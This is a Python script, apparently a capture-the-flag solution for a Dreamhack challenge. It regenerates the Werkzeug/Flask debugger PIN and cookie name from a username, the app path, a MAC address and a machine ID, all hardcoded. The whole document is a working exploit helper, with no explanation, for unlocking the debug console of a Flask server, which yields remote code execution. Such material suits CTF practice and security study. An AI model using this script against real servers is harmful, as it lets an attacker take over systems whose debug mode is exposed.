import hashlib
from itertools import chain


def get_pin_and_cookie_name(username, PATH, MAC_ADRESS, MACHINE_ID):
    rv = None
    num = None
    
    probably_public_bits = [
        username,
        'flask.app',
        'Flask',
        PATH,
    ]

    private_bits = [
        MAC_ADRESS,
        MACHINE_ID,
    ]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    if num is None:
        h.update(b"pinsalt")
        num = ("%09d" % int(h.hexdigest(), 16))[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name

rv, cookie_name = get_pin_and_cookie_name("dreamhack", "/usr/local/lib/python3.8/site-packages/flask/app.py", "187999308496897", b'c31eea55a29431535ff01de94bdcf5cflibpod-f88dad640b83256c33c2db26e97160623d4442fd6b6ed3f6635bc2ffb500d8a1')

print(f'[+]rv : {rv}')
print(f'[+]cookie_name : {cookie_name}')